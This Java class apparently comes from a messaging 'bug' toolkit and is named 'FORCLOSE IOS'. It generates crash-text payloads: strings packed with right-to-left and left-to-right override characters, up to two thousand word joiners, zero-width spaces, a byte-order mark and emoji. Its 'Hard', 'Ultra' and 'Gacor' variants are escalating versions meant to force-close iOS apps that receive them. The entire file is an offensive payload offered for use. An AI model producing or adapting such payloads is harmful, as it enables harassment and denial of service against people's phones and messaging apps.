package com.darkxrat.mantax.func.bug;

public class ForcloseIos {
    public static final String NAMA = "FORCLOSE IOS";
    public static final String TIPE = "BUG";

    public static String func() {
        // Unicode berbahaya + kombinasi karakter
        StringBuilder sb = new StringBuilder();
        sb.append("\u202E"); // RTL override
        sb.append("\u202D"); // LTR override
        for (int i = 0; i < 500; i++) {
            sb.append("\u2060"); // Word joiner
        }
        sb.append("\u200B\u200B\u200B\u200B"); // Zero width space
        sb.append("\uFEFF"); // BOM
        sb.append("\uD83D\uDCA9"); // Emoji
        sb.append("\uD83D\uDD25"); // Emoji
        return sb.toString();
    }

    public static String funcHard() {
        return func() + func() + func();
    }

    public static String funcUltra() {
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < 2000; i++) {
            sb.append("\u2060");
        }
        sb.append("\u202E");
        sb.append("\u202D");
        return sb.toString();
    }

    public static String funcGacor() {
        return funcUltra() + funcHard();
    }
}